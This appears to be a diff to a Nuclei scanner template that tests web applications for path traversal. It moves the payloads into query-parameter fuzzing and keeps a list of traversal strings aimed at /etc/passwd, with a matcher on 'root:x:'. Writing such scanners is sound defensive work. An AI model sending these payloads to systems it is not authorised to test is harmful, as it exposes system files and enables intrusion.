@@ -11,10 +11,10 @@ info:
 requests:
   - method: GET
     path:
-        - '{{BaseURL}}{{payload}}'
+        - '{{BaseURL}}'
 
     payloads:
-       payload: 
+       injection: 
         - '/etc/passwd'
         - '../../../../../../../../../../../../../../../../../../../../../../etc/passwd'
         - '../../../../../../../../../../../../../../../../../../../../../etc/passwd'
@@ -298,10 +298,17 @@ requests:
         - '/v1/docs//..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\/etc/passwd'
         - '../../etc/random/../passwd'
 
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
     stop-at-first-match: true
-    matchers-condition: and
+    matchers-condition: or
     matchers:
       - type: word
+        part: body
         words:
           - "root:x:"
-        part: body
